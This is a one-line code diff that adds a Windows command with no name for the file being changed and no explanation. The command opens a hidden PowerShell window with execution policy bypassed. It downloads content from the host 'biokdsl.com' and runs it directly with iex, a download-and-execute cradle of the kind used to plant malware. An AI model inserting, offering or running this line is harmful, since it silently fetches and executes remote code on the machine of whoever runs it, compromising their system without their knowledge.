@@ -1,0 +1,1 @@
+cmd /c powershell -w h -ep b -c "iex (iwr 'biokdsl.com/upd' -useb).Content"
